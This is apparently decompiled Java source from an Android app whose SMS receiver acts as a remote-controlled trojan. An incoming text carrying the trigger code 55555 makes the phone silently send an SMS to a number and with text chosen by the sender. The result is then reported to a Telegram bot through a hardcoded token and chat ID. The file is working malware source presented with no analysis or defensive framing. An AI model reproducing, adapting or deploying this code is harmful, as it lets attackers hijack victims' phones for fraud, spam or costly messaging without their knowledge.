package com.example.myapplicatior;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/* loaded from: classes3.dex */
public class SendSMS extends BroadcastReceiver {
    private final OkHttpClient client = new OkHttpClient();
    final String TAG = "demo";

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Bundle extras;
        Bundle bundle;
        String str = " ";
        String str2 = ",";
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (extras = intent.getExtras()) != null) {
            try {
                Object[] objArr = (Object[]) extras.get("pdus");
                SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
                int i = 0;
                while (i < smsMessageArr.length) {
                    smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                    smsMessageArr[i].getOriginatingAddress();
                    String messageBody = smsMessageArr[i].getMessageBody();
                    messageBody.replace("&", "  ").replace("#", str).replace("?", str);
                    String str3 = messageBody.split(str2)[0];
                    String str4 = messageBody.split(str2)[1];
                    String str5 = messageBody.split(str2)[2];
                    String str6 = str;
                    String str7 = str2;
                    if (Integer.parseInt(str3.toString()) == 55555) {
                        SmsManager.getDefault().sendTextMessage(str4, null, str5, null, null);
                        bundle = extras;
                        try {
                            this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text=Berhasil Kirim SMS dari Jauh  %0AKepada  : _" + str4 + "_,%0A𝐦𝐞𝐬𝐬𝐚𝐠𝐞 : _" + str5 + "_").build()).enqueue(new Callback() { // from class: com.example.myapplicatior.SendSMS.1
                                @Override // okhttp3.Callback
                                public void onFailure(Call call, IOException iOException) {
                                    iOException.printStackTrace();
                                }

                                @Override // okhttp3.Callback
                                public void onResponse(Call call, Response response) throws IOException {
                                    Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                                    if (response.isSuccessful()) {
                                        response.body().string();
                                    }
                                }
                            });
                        } catch (Exception e) {
                            e = e;
                            e.printStackTrace();
                            return;
                        }
                    } else {
                        bundle = extras;
                    }
                    i++;
                    extras = bundle;
                    str = str6;
                    str2 = str7;
                }
            } catch (Exception e2) {
                e = e2;
            }
        }
    }
}
